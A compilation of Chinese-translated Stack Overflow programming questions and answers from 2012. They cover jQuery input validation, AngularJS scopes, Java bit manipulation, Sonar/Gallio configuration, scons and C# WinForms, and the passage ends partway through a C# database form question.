    ~foreach from=$assigner key=k item=r`
        ~foreach  from=$r item=m`
            <option id="allexec" value="all" selected>All</option>
            <option class="~$k`" class="searchSelect"  style="display: none"   value="~$m.execid`">~$m.display_name`</option>
        ~/foreach` 
    ~/foreach` 
    </select> 
</td> 
```

现在最重要的是 jquery 部分——

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js" type="text/javascript">  </script>
<script>
$(document).ready(function() {

$("input[name=salestype[]]:checkbox").click(function() {
  var selected = new Array();
  $('#nafrat').show();
  $("input:checkbox[name=salestype[]]:checked").each(function() {
    selected.push($(this).val());
    });
  $('#myops').children('option').hide();
  var btnchk= new Array();
  btnchk = $('input:checkbox[name="salestype[]"]:checked');

  if (btnchk.length) {
  $('#allexec').show();
  }
  else {
  $('#allexec').hide();
  $('#nafrat').hide();
  }
  $.each( selected, function(i, l){
      $('.'+l).show();
      });
  selected = new Array();
  btnchk  = new Array();

});
</script> 
```

为此，我可以在选择两个或多个复选框时合并下拉列表中的值，并进一步取消选中任何一个，从下面的列表中删除相应的内容。

**注意**：上面显示的*HTML*包含*smarty*标记，还有一些*PHP*变量，如*“$assigner”*等。

# javascript - 输入中只有带点（不是逗号）的浮点值 - jQuery

> ID：10514106
> 
> 赞同：3
> 
> 时间：2012-05-09T10:17:08.973
> 
> 标签：javascript, jquery

我希望在我的输入中始终只使用带有点（不是逗号）的浮点值。

```
<input type="text" class="dot"> <br />
<input type="text" class="dot"> <br />
<input type="text" class="dot"> <br />

$('.dot').keydown(function(){
        $(this).val($(this).val().toString().replace(/\,/g, '.'));  
}) 
```

这将逗号替换为点，但这不应该有> 1个点和其他......这应该只接受[0-9]和。

如果我输入与其他 [0-9] 和 . 那么这个值应该被删除 - ''。

我怎样才能做到？

[http://jsfiddle.net/ZtkBW/](http://jsfiddle.net/ZtkBW/)

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-09T10:21:36.173

Hiya**演示** [http://jsfiddle.net/9Ry9t/](http://jsfiddle.net/9Ry9t/) **或** [http://jsfiddle.net/ZtkBW/2/](http://jsfiddle.net/ZtkBW/2/) **或** [http://jsfiddle.net/HJnLD/](http://jsfiddle.net/HJnLD/)

与您的解决方案有点不同，但如果您热衷于使用它，它将不允许`characters`在文本框中输入任何内容。

该解决方案对数字和浮点数进行了全面验证，它不需要（点）

**代码示例**

```
$('.number').keypress(function(event) {
    if(event.which < 46
    || event.which > 59) {
        event.preventDefault();
    } // prevent if not number/dot

    if(event.which == 46
    && $(this).val().indexOf('.') != -1) {
        event.preventDefault();
    } // prevent if already dot
});​ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:19:21.113

这是一个非常糟糕的 if 语句来规避`parseFloat`可以解析它在字符串中找到的第一个数字并且`indexOf`只返回字符的第一个索引（不是所有索引）的事实。

将 的值存储在变量中可能会更聪明，`$(this).val()`但我将把它作为练习留给读者。（现在没时间）

```
if(!isNaN(parseFloat($(this).val()) && $(this).val().indexOf(".") > -1 && $(this).val().indexOf(".") == $(this).val().lastIndexOf(".")) { 
    // do something, your value is a valid float
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-09T10:28:54.477

你可以试试这个：

[http://jsfiddle.net/ZtkBW/5/](http://jsfiddle.net/ZtkBW/20/)

```
var parseInput = function(val) {
  var floatValue = parseFloat(val);
  return isNaN(floatValue) ? '' : floatValue;
}

$('.number').keyup(function(){
  var value = $(this).val()+'';
  if (value[value.length-1] !== '.') {
    $(this).val(parseInput(value));
  }
}).focusout(function(){
  $(this).val(parseInput($(this).val()+''));
}) 
```

如果无效，我使用 keyup 来避免显示字符​​。正如评论中提到的，我也使用了focusout。如果最后输入的字符是“。”，我不解析。因为您将无法输入十进制值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-15T04:04:35.327

我有同样的问题 - 需要一个文本输入来只接受一个整数或一个小数输入（只有一个。）必须混合一些解决方案，但这现在可以工作了：

```
$(".dot").keyup(function(event){
    this.value=this.value.replace(/[^0-9.]/g,'');
    var parts=this.value.split(".");
    var decimal=false;
    for(var part in parts)
    {
        if(part==0) this.value=parts[part];
        if(part==1) this.value=this.value+"."+parts[part];
    }
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-09T10:20:35.850

```
$('.dot').keydown(function(){
    $(this).val($(this).val().toString().replace(/^[0-9]\./g, ',')
    .replace(/\./g, ''));
})​ 
```

[它的行为方式](http://jsfiddle.net/ZtkBW/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-09T10:22:27.423

我不太确定你想做什么，
但是这个怎么样

```
$(this).val(parseFloat($(this).val()) || 0); 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2017-02-24T10:28:12.140

尝试这个 ：

```
$("#txtSellerPrice").keydown(function (e) { 
    if (e.keyCode == 110 && this.value.split('.').length == 2) 
    { 
        e.preventDefault(); 
    } 
    if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 190,110]) !== -1 ||         (e.keyCode == 65 && ( e.ctrlKey === true || e.metaKey === true ) ) ||                   (e.keyCode >= 35 && e.keyCode <= 40)) {  return;  } if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) 
    { e.preventDefault(); } 
    }); 
```

# c# - DDD：报告层（查看模型/报告模型）

> ID：10514109
> 
> 赞同：0
> 
> 时间：2012-05-09T10:17:17.057
> 
> 标签：c#, asp.net, domain-driven-design, viewmodel, layer

我有一个模型和一个报告服务。这很简单：

```
public class ReportService
{
    public Report Generate(){//}
}

public class Report
{
    string Title;   
    List<ReportField> Fields;
}

public class ReportField
{
    string FieldName;
    string FieldValue;  
} 
```

输出看起来像：

> 报告标题
> 
> 客户：Foo
> 数量：50.5
> 数量：100

我的问题是它属于哪一层？这是一个视图模型吗？我将其输出为 pdf、excel 并将其绑定到网格。我的应用程序服务返回此模型是一种好习惯吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:02:12.837

我希望您的`Generate`方法包含业务逻辑，因此这属于您的业务层。但是，我希望 generate 方法返回一个`Report`对象，并且在您的表示层中，您可以将其从 a`Report`转换为 PDF。

# jquery - jquery 语句 - 选择问题

> ID：10514111
> 
> 赞同：1
> 
> 时间：2012-05-09T10:17:34.500
> 
> 标签：jquery, jquery-ui

我做了一些调试，我发现了这个语句：

```
$(this)[widget.widgetName](widget.attributes); 
```

其中 widget.widgetName = 图表

jquery中这条语句是什么意思？

在堆栈中我看到 jquery_ui 调用 jquery-ui 的 _createwidget

为什么 createwidget 被调用？

问候， 约西

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:49:32.603

`$(this)[widget.widgetName]`使用方括号表示法来指代值为 的属性`widget.widgetName`。有关方形后退和“点表示法”之间的比较，请参阅[MDC 文章](https://developer.mozilla.org/en/JavaScript/Guide/Working_with_Objects#Objects_and_properties)。

正如你所说，它指的是`widget.widgetName`：`chart`

```
$(this).chart 
```

然后`(widget.attributes);`只是简单地调用函数并`widget.attributes`作为第一个也是唯一的参数传递：

```
$(this).chart(widget.attributes); 
```

至于“为什么会调用 createwidget？” 该`chart()`函数必须调用它，无论是隐式（通过另一个函数）还是显式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:52:12.103

```
$(this)[widget.widgetName] 
```

指的是**widget.widgetName**定义的**$(this)的属性**

 **在这种情况下，它只是

```
$(this).chart 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:48:12.277

`$(this)`指的是一个 jQuery 对象。在这种情况下，您位于事件处理程序、元素选择器或其他类型的 jQuery 上下文中，其中`$(this)`引用外部选择器中的 jQuery 对象。**

# c# - 如何在 WCF 和 Silverlight 应用程序上使用相同的类库

> ID：10514116
> 
> 赞同：3
> 
> 时间：2012-05-09T10:17:50.067
> 
> 标签：c#, wcf, silverlight, wcf-ria-services, class-library

您好我想从我的 Silverlight 应用程序和基于 WCF 的服务中使用相同的类库。我创建了一个 Silverlight C# 类库，发现 WCF 服务不允许添加对 Silverlight 项目类型的引用。所以

*   我应该怎么做才能完成这项工作？

*   如果 Silverlight 与 WCF 服务通信，Silverlight 可以调用 Silverlight 类库上的方法吗？

*   银光总是这么难吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T12:40:28.310

可移植类库

[http://msdn.microsoft.com/en-us/library/gg597391.aspx](http://msdn.microsoft.com/en-us/library/gg597391.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T10:45:07.240

尝试制作 2 个类库，一个用于 Silverlight，一个用于 WCF。两者都使用相同的 C# 源代码文件。在第二个项目中，您可以将文件添加为链接（在解决方案资源管理器中的 Visual Studio 中：添加现有项目，然后在下拉添加按钮中，选择“添加为链接”。

这就是我们解决共享代码的方法。但是，您必须将自己限制在两个世界中都存在的库调用中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-09T21:24:12.557

现在很容易：D - 只需使用`.shared`技巧。它允许您在服务器和客户端之间共享相同的代码。看这里： http: [//msdn.microsoft.com/en-us/library/ee707371 (v=vs.91).aspx](http://msdn.microsoft.com/en-us/library/ee707371(v=vs.91).aspx)

PS.：您甚至可以在 .shared 类上添加条件指令，如下所示：

```
#if SILVERLIGHT
        MessageBox.Show("yay, I will run only on silverlight");
#endif 
```

# javascript - 在没有实际按键的情况下调用 KeyPress 事件

> ID：10514123
> 
> 赞同：7
> 
> 时间：2012-05-09T10:18:03.503
> 
> 标签：javascript, keypress

就是想。是否可以在不实际按下键的情况下在 JavaScript 中调用按键事件？例如，假设我的网页上有一个按钮，当单击该按钮时，我想调用一个事件，就好像按下了一个特定的键一样。我知道这很奇怪，但这可以在 JavaScript 中完成。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T10:41:22.457

是的，这可以使用[initKeyEvent](https://developer.mozilla.org/en/DOM/event.initKeyEvent)来完成。不过，使用起来有点冗长。如果这让您感到困扰，请使用 jQuery，如[@WojtekT](https://stackoverflow.com/a/10514164/851498)的答案所示。

否则，在 vanilla javascript 中，它是这样工作的：

```
// Create the event
var evt = document.createEvent( 'KeyboardEvent' );

// Init the options
evt.initKeyEvent(
             "keypress",        //  the kind of event
              true,             //  boolean "can it bubble?"
              true,             //  boolean "can it be cancelled?"
              null,             //  specifies the view context (usually window or null)
              false,            //  boolean "Ctrl key?"
              false,            //  boolean "Alt key?"
              false,            //  Boolean "Shift key?"
              false,            //  Boolean "Meta key?"
               9,               //  the keyCode
               0);              //  the charCode

// Dispatch the event on the element
el.dispatchEvent( evt ); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-09T10:21:27.270

如果您使用的是 jquery：

```
var e = jQuery.Event("keydown");
e.which = 50; //key code
$("#some_element").trigger(e); 
```

# java - Java中整数的哪个位

> ID：10514132
> 
> 赞同：5
> 
> 时间：2012-05-09T10:18:43.710
> 
> 标签：java, bit-manipulation

我编写了这段代码来检查Java中整数（如果以二进制表示）的哪些位：

```
public static List<String> list(int val)
{
    List<String> dummyList = new ArrayList<String>();

    int bit = 1;
    int x;

    for(int i=0; i<32; i++)
    {
        x = bit;
        if((x&val)!=0)
            dummyList.add(String.valueOf(i+1));
        bit = bit << 1;
    }

    return dummyList;
} 
```

上面编写的代码工作正常。但它有一个运行 32 次的循环（在 Java 中整数是 32 位长）。我想尽量减少这种复杂性。请分享更好的解决方案。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T23:08:02.143

您可以使用位掩码来尝试减少循环次数。您添加了一些操作，但可能会执行一半的循环：

```
public static List<String> list(int val) {
    List<String> dummyList = new ArrayList<String>();
    int loop = 32;

    // Mask the 16 MSB if all are zero only loop on the 16 LSB
    if((val & 0xFFFF0000) == 0){
        loop = 16;
    }

    int bit = 1;
    int x;

    for (int i = 0; i < loop; i++) {
        x = bit;
        if ((x & val) != 0) {
            dummyList.add(String.valueOf(i + 1));
        }
        bit <<= 1;
    }

    return dummyList;
} 
```

根据传入的数据，这可能会增加时间。

您还可以通过一次执行两个位来将循环减半：

```
public static List<String> list(int val) {
    List<String> dummyList = new ArrayList<String>();

    int bit = 3;
    int x;

    for (int i = 0; i < 32; i += 2) {
        x = (bit & val);
        switch (x) {
            case 1:
                dummyList.add(String.valueOf(i + 1));
                break;
            case 2:
                dummyList.add(String.valueOf(i+2));
                break;
            case 3:
                dummyList.add(String.valueOf(i+1));
                dummyList.add(String.valueOf(i+2));
                break;
            default:
        }
        val >>= 2;
    }

    return dummyList;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-02T02:44:30.477

改进`O(1)`代码似乎微不足道，但此代码略有改进：

```
public static List<String> list(int val) {
    List<String> dummyList = new ArrayList<String>();
    for (int i=0; val!=0 && i<32; ++i){
        if ((1 << i & val) != 0) {
            dummyList.add("" + (i+1));
            val &= val -1;  // unset the last set bit (current bit)
        }                   // causes loop to end early when all bits are counted
    }
    return dummyList; 
```

与其进行所有 32 位比较，此代码将在计算完最后一位后立即结束。对于用 s 稀疏填充的整数，它的`1`效率要高得多，而对于高度填充的整数，它的效率也不低。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-02T02:51:10.533

由于您知道整数的确切长度，因此我建议您改用 a `bool[]`。但是，对于复杂性，您无能为力。它尽可能快，而且 JIT 可能无论如何都会展开这段代码的循环。

```
public static bool[] list(int val)
{
    bool[] a = new bool[32];
    for(int i=0; i<32; i++)
    {
        a[i] = ((1 << i) & val) != 0;
    }
    return a;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T10:23:32.713

复杂度是 O(1)，所以没有太多可以“最小化”的地方。

你的代码没问题..这里稍微重构一下。

```
public static List<String> list(int val) {
    List<String> dummyList = new ArrayList<String>();
    for (int i = 0; i < 32; i++)
        if ((1 << i & val) != 0)
            dummyList.add("" + (i+1));
    return dummyList;
} 
```

顺便说一句，您是否考虑过使用[`BitSet`](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/BitSet.html)?

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-09T10:24:32.737

32 个循环听起来很适合这个应用程序。如果您想更快地收集数字，可以使用 StringBuffer 而不是 List。

```
public static String list(int val)
{
    StringBuffer dummyList = new StringBuffer();

    int bit = 1;
    int x;

    for(int i=0; i<32; i++)
    {
        x = bit;
        dummyList.append((x&val) ? '1' : '0' );
        bit = bit << 1;
    }

    return dummyList.toString();
} 
```

# sql-server-2008 - 无法在 sql server 2005 中创建约束

> ID：10514141
> 
> 赞同：0
> 
> 时间：2012-05-09T10:19:27.600
> 
> 标签：sql-server-2008

将对象添加到数据库时出现以下错误。

> 外键“fk4150”引用了不是用户表的对象“TESTPOLY2”。无法创建约束。请参阅以前的错误。在 SQL 中：ALTER TABLE [WORKLOG2SETUP] ADD CONSTRAINT fk4150 FOREIGN KEY (related_id) REFERENCES TESTPOLY2

如果有人知道解决方案，请告诉我。

干杯，普拉文

# scope - 在 AngularJS 中，如何找到页面上的所有范围？

> ID：10514147
> 
> 赞同：31
> 
> 时间：2012-05-09T10:19:49.840
> 
> 标签：scope, angularjs

一旦我们有了一个范围，我们就可以导航到它的根并探索范围层次结构。

但是有没有一种直接的方法可以找到页面上的所有范围？

同样给定一个 HTML 元素，是否有直接的方法来找到它的封闭范围？

* * *

## 回答 #1

> 赞同：80
> 
> 时间：2012-05-11T19:18:24.343

您可以使用此 CSS 选择器查看页面上的所有范围

```
.ng-scope { border: 1px solid red; } 
```

和所有的绑定：

```
.ng-binding { border: 1px solid red; } 
```

然后，您可以通过将 DOM 元素转换为选择器来检索它们

```
var selector = angular.element(some_dom_element); 
```

然后使用选择器检索范围/控制器/注射器

```
var scope = selector.scope();
var controller = selector.controller();
var injector = selector.injector(); 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2014-02-14T10:16:16.793

并非所有范围都绑定到元素。如果您想要页面上的**所有**范围，请像这样遍历范围树：

```
function getScopes(root) {
    var scopes = [];

    function visit(scope) {
        scopes.push(scope);
    }
    function traverse(scope) {
        visit(scope);
        if (scope.$$nextSibling)
            traverse(scope.$$nextSibling);
        if (scope.$$childHead)
            traverse(scope.$$childHead);
    }

    traverse(root);
    return scopes;
}

getScopes($rootScope) 
```

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2012-05-11T18:37:47.560

我不知道为什么这对你有用，但你可以这样做：

```
scopeElements = document.getElementsByClassName('ng-scope');
scopes = [].map.call(scopeElements, function(e){ return angular.element(e).scope(); }) 
```

另一种选择是使用我们的私有 api 从根范围开始遍历范围树：$$childHead 和 $$nextSibling。

您更有可能只想查看范围边界的位置，您可以这样做：

```
scopeElements = document.getElementsByClassName('ng-scope');
angular.element(scopeElements).css('border', '1px solid red'); 
```

然后，您可以使用 web 检查器选择感兴趣的元素并通过以下方式获取其范围：

```
angular.element($0).scope(); 
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2012-08-21T16:39:13.560

我推荐 AngularJS Batarang。它是一个调试工具，可让您可视化页面上的所有范围（以及其他内容）。

[https://github.com/angular/angularjs-batarang](https://github.com/angular/angularjs-batarang)

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2012-05-09T22:24:28.100

您可以使用以下方法找到元素的范围：

```
$(element).scope() 
```

或者

```
angular.element(element).scope() 
```

我认为没有一种方法可以轻松地获取页面上的所有范围（除了从根范围向下导航）。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2012-08-02T07:48:37.463

您应该在 Google Chrome 浏览器中开发您的应用程序（如果您还没有使用它），然后您可以使用很棒的 Batarang 扩展程序，它将新的专用 AngularJS 面板添加到开发人员工具中。您可以在那里看到所有范围，它们之间的关系是什么以及具有其所有属性的值。

[http://blog.angularjs.org/2012/07/introducing-angularjs-batarang.html](http://blog.angularjs.org/2012/07/introducing-angularjs-batarang.html)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-04-27T19:08:18.057

在 Chrome 中，使用开发者工具。我使用控制台命令行。

在开发人员工具的 HTML 面板中选择一个元素，然后在控制台中输入：

```
angular.element($0).scope() 
```

或者只需右键单击页面元素并选择：检查元素。

`$($0).scope()`将返回与元素关联的范围。您可以立即看到它的属性。

要查看元素父范围：

```
$($0).scope().$parent 
```

您也可以将其链接：

```
$($0).scope().$parent.$parent 
```

您可以查看根范围：

```
$($0).scope().$root 
```

如果您突出显示具有隔离范围的指令，您可以使用以下命令查看它：

```
$($0).isolateScope() 
```

如果可用，您可以对子范围和同级范围执行相同的操作。

```
$($0).scope().$sibling 
```

我可以在范围内来回走动，以验证哪个范围有哪些控制器、对象等，当您使用自定义指令时，这是必不可少的。在大型代码库中，要找到这样的东西并不容易。

最近，我有两个同名的控制器，除了一个附加到视图的大写字母。我使用了错误的控制器，我花了一段时间才意识到这是我的绑定问题。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-07-24T22:06:39.987

在 Angulars 中`$rootScope`，它是每个作用域的根。它有**子**字段，整个层次结构都在**$rootScope**内。如果你想找到一个带有 html 元素的作用域，你可能会遇到问题，因为这个作用域可以是**独立**作用域.也许你在那里有一个指令，它的范围是孤立的。如果你有类似的东西，试着使用**`el.isolatedScope()`**

# jquery - PNG透明度问题-带有黑色阴影的褪色图像-IE中的边框

> ID：10514154
> 
> 赞同：3
> 
> 时间：2012-05-09T10:20:42.623
> 
> 标签：jquery, shadow, image-rotation

我使用图像旋转器在主页上显示一些图像。所有图像均为PNG格式。问题出在 IE (7, 8) - 图像旁边有黑色阴影......我花了几个小时解决这个问题，但仍然不知道问题出在哪里以及如何删除它......

没有人有类似的问题和提示，如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:28:25.820

尝试：

```
img.yourimg {
    background: transparent;
    -ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr=#00FFFFFF,endColorstr=#00FFFFFF)"; /* IE8 */   
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#00FFFFFF,endColorstr=#00FFFFFF);   /* IE6 & 7 */ 
} 
```

或者使用PNG8（它会在你的图像周围创建一个小的白色边框，但我认为你不想要那个。）

或者喜欢我上面的评论。

# code-coverage - Sonar、Sonar-runner、Gallio 和 NCover ... Gallio 不运行 :(

> ID：10514155
> 
> 赞同：0
> 
> 时间：2012-05-09T10:20:56.413
> 
> 标签：code-coverage, sonarqube, gallio, ncover, static-code-analysis

有没有人真正设法让声纳跑步者与 Gallio 和 Ncover 合作？我已经尝试了书中的所有组合，并且在运行过程中它一直告诉我

“INFO spcgGallioSensor - Gallio 不会执行，因为没有测试项目。”

如果我单独运行所有内容（NCover，Gallio），它们会给出结果，而不是使用 Sonar-runner

请帮忙！！！

这就是我的配置看起来像 btw （sonar-project.properties 文件）

```
# Project identification
sonar.projectKey=DMG:PilotCompletePackageSolution
sonar.projectVersion=4.0.0  
sonar.projectName=Pilot Filepointer

# Info required for Sonar  
sources=.  
sonar.language=cs  

#Core C# Settings  
sonar.dotnet.visualstudio.solution.file=FilePointer.sln  

#Gendarme  
sonar.gendarme.assemblies=\build\\DmgTech*.*  
sonar.gendarme.mode= 

# Gallio  
sonar.gallio.mode=
sonar.gallio.reports.path=bin/
sonar.gallio.installDirectory=C:/program files (x86)/gallio
sonar.gallio.coverage.tool=NCover
sonar.donet.visualstudio.testProjectPattern=*test*
sonar.donet.visualstudio.testProjectPattern=*Test*
sonar.donet.visualstudio.testProjectPattern=*Tests
sonar.donet.visualstudio.testProjectPattern=*UnitTest*  
sonar.NCover.installDirectory=c:/Program Files(x86)/NCover

# FXCop  
sonar.fxcop.mode=  

#StyleCop  
sonar.stylecop.mode=

#NDeps
sonar.ndeps.mode= 
```

**更新**

这是声纳创建的覆盖范围：

```
<?xml version="1.0" encoding="utf-8"?>
<!-- saved from NCover 3.0 Export url='http://www.ncover.com/' -->
<coverage profilerVersion="3.4.18.6937" driverVersion="3.4.18.6937" exportversion="3" viewdisplayname="" startTime="2012-05-11T08:07:34.8625409Z" measureTime="2012-05-11T08:07:40.7988805Z" projectName="New Project" buildid="734ad123-bd97-46c4-acfe-2ad0386b4d6a" coveragenodeid="0" failed="false" satisfactorybranchthreshold="95" satisfactorycoveragethreshold="95" satisfactorycyclomaticcomplexitythreshold="20" satisfactoryfunctionthreshold="80" satisfactoryunvisitedsequencepoints="10" uiviewtype="TreeView" viewguid="New Project" viewfilterstyle="None" viewreportstyle="SequencePointCoveragePercentage" viewsortstyle="Name">
  <rebasedpaths />
  <filters />
  <documents>
    <doc id="0" excluded="false" url="None" cs="" csa="00000000-0000-0000-0000-000000000000" om="0" nid="0" />
  </documents>
</coverage> 
```

这是手动覆盖：

```
<?xml version="1.0" encoding="utf-8"?>
<!-- saved from NCover 3.0 Export url='http://www.ncover.com/' -->
<coverage profilerVersion="3.4.18.6937" driverVersion="3.4.18.6937" exportversion="3" viewdisplayname="" startTime="2012-05-10T06:06:29.2440585Z" measureTime="2012-05-10T06:06:31.6464627Z" projectName="New Project" buildid="2c2073a0-18a6-4976-8858-c16755d1d1ff" coveragenodeid="0" failed="false" satisfactorybranchthreshold="95" satisfactorycoveragethreshold="95" satisfactorycyclomaticcomplexitythreshold="20" satisfactoryfunctionthreshold="80" satisfactoryunvisitedsequencepoints="10" uiviewtype="TreeView" viewguid="New Project" viewfilterstyle="None" viewreportstyle="SequencePointCoveragePercentage" viewsortstyle="Name">
  <rebasedpaths />
  <filters />
  <documents>
    <doc id="1" excluded="false" url="C:\tfsdata\FilePointer\UITest\UnitTest.cs" cs="81FA01B2B109478673AC792E586754E5" csa="406ea660-64cf-4c82-b6f0-42d48172a799" om="1" nid="0" />
    <doc id="0" excluded="false" url="None" cs="" csa="00000000-0000-0000-0000-000000000000" om="0" nid="0" />
  </documents>
  <module moduleId="1" name="C:\tfsdata\FilePointer\bin\UITest.dll" assembly="UITest" assemblyIdentity="UITest, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null, processorArchitecture=x86" nid="0">
    <class name="UITest.UnitTest" signature="UITest.UnitTest" excluded="false" nid="0">
      <method name=".ctor" signature=".ctor() : void" excluded="false" instrumented="true" cc="1" vc="1" nid="0">
        <seqpnt vc="1" o="0" l="16" el="16" c="9" ec="26" ex="false" fl="65536" doc="1" nid="0" />
        <seqpnt vc="1" o="8" l="21" el="21" c="9" ec="10" ex="false" fl="65536" doc="1" nid="0" />
        <seqpnt vc="1" o="9" l="0" el="0" c="0" ec="0" ex="false" fl="131072" doc="1" nid="0" />
      </method>
      <method name="get_TestContext" signature="get_TestContext() : Microsoft.VisualStudio.TestTools.UnitTesting.TestContext" excluded="false" instrumented="false" cc="1" vc="0" nid="0">
        <seqpnt vc="0" o="1" l="33" el="33" c="17" ec="44" ex="false" fl="65536" doc="1" nid="0" />
        <seqpnt vc="0" o="A" l="34" el="34" c="13" ec="14" ex="false" fl="65536" doc="1" nid="0" />
        <seqpnt vc="0" o="B" l="0" el="0" c="0" ec="0" ex="false" fl="131072" doc="1" nid="0" />
      </method>
      <method name="set_TestContext" signature="set_TestContext(Microsoft.VisualStudio.TestTools.UnitTesting.TestContext value) : void" excluded="false" instrumented="false" cc="1" vc="0" nid="0">
        <seqpnt vc="0" o="1" l="37" el="37" c="17" ec="45" ex="false" fl="65536" doc="1" nid="0" />
        <seqpnt vc="0" o="8" l="0" el="0" c="0" ec="0" ex="false" fl="131072" doc="1" nid="0" />
        <seqpnt vc="0" o="8" l="38" el="38" c="13" ec="14" ex="false" fl="65536" doc="1" nid="0" />
      </method>
      <method name="TestMethod1" signature="TestMethod1() : void" excluded="false" instrumented="true" cc="1" vc="1" nid="0">
        <seqpnt vc="1" o="1" l="0" el="0" c="0" ec="0" ex="false" fl="131072" doc="1" nid="0" />
        <seqpnt vc="1" o="1" l="69" el="69" c="9" ec="10" ex="false" fl="65536" doc="1" nid="0" />
      </method>
    </class>
  </module>
</coverage> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-10T16:22:20.610

声纳与 Gallio + NCover 配合得很好，你只需要清理你的 sonar-project.properties 文件，因为一些参数没有正确设置（见[http://docs.codehaus.org/display/SONAR/sonar-csharp-gallio-插件](http://docs.codehaus.org/display/SONAR/sonar-csharp-gallio-plugin)）

*   您应该只有 1 个“sonar.donet.visualstudio.testProjectPattern”属性（应该类似于“sonar.donet.visualstudio.testProjectPattern= *Test* ”）。该插件不支持多个。
*   “sonar.gendarme.assemblies”的值对我来说很奇怪：你现在应该删除它

# scons - 如何找出用于在 scons 中构建某些东西的依赖项和构建规则

> ID：10514157
> 
> 赞同：3
> 
> 时间：2012-05-09T10:21:00.740
> 
> 标签：scons

我不想使用 scons --n，我想看看某些东西*是*如何构建的，而不是现在如何构建。

我认为它可以以某种方式使用 .sconsdblite 。

有人做过吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:34:07.517

[SCons 手册页](http://www.scons.org/doc/production/HTML/scons-man.html)解释了`--tree`可用于显示目标的依赖关系信息的命令行选项。

最基本的使用方法如下：

```
# scons --tree=all 
```

根据您的情况，其中解释了几种不同的树选项。

此外，还有几个`--debug`选项可用。

这可能有助于您在评论中提到的内容：`--debug=explain`

```
Print an explanation of precisely why scons is deciding to (re-)build 
any targets. (Note: this does not print anything for targets that are
not rebuilt.) 
```

# c# - 为什么我的按钮在 c# 应用程序中不起作用

> ID：10514161
> 
> 赞同：0
> 
> 时间：2012-05-09T10:21:14.250
> 
> 标签：c#, winforms

我有一个链接到数据库的表单，并且控制表单的按钮不起作用，我没有收到任何错误，只是没有发生任何事情。

DisplayRow 类

```
private void DisplayRow(int rowIndex)
    {
        // Check that we can retrieve the given row
        if (myDataTable.Rows.Count == 0)
            return; // nothing to display
        if (rowIndex >= myDataTable.Rows.Count)
            return; // the index is out of range

        // If we get this far then we can retrieve the data
        try
        {
            DataRow row = myDataTable.Rows[rowIndex];
            textBox1.Text = row["FilePath"].ToString();
            textBox2.Text = row["Subject"].ToString();
            textBox3.Text = row["Title"].ToString();
            textBox4.Text = row["Keywords"].ToString();
            textBox5.Text = row["MediaType"].ToString();
        }
        catch (Exception ex)
        {
            MessageBox.Show("Error in DisplayRow : \r\n" + ex.Message);
        }

    } 
```

应该移动到下一条记录的按钮

```
private void button1_Click(object sender, EventArgs e)
    {
        if (currentRecord < myDataTable.Rows.Count -1)
        {
            currentRecord++;
            DisplayRow(currentRecord);

        } 
```

但就像我说的，当我运行应用程序时，什么都没有发生，没有错误，什么都没有。

编辑：按照要求为 MyDataTable 编码

```
private void Form1_Load(object sender, EventArgs e)
    {
        {
            String command = "SELECT * FROM Media";
            try
            {
                myConnection = new OleDbConnection(access7ConnectionString);
                myAdapter = new OleDbDataAdapter(access7ConnectionString, myConnection);
                myCommandBuilder = new OleDbCommandBuilder(myAdapter);
                myDataTable = new DataTable();
                FillDataTable(command);
                DisplayRow(currentRecord);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        } 
```

我正在运行的完整代码..

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Data.OleDb;
namespace MediaPlayer
{
public partial class Media : Form
{

    // Use this connection string if your database has the extension .accdb
    private const String access7ConnectionString = @"Provider=Microsoft.ACE.OLEDB.12.0;Data Source=|DataDirectory|\MediaDatabase.accdb";
    // Use this connection string if your database has the extension .mdb
    private const String access2003ConnectionString = @"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=|DataDirectory|\MediaDatabase.mdb";
    // Data components
    private DataTable myDataTable;

    // Index of the current record
    private int currentRecord = 0;

    private void FillDataTable(string selectCommand)
    {
